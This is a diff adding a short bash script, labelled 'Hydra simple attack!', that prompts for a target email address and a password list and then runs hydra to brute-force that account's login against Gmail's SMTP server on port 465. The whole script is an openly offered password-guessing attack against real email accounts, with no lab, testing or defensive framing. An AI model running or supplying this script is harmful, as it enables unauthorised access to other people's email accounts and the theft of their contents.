@@ -1,0 +1,19 @@
+#!/usr/bin/bash
+c='\e[0;34m' 
+o='\033[92m' 
+l='\e[1;32m' 
+
+clear
+
+echo -e $c"Hydra simple attack!"
+echo -e $c"Kodename : Bash"
+echo -e $c"By Fani an"
+echo -e $l"email:"
+read a
+
+echo -e $l"lis:"
+echo -e "ex:/sdcard/pas.txt"
+read b
+
+hydra -l $a -P $b -s 465 -S -v -V -t 1 smtp://smtp.gmail.com
+
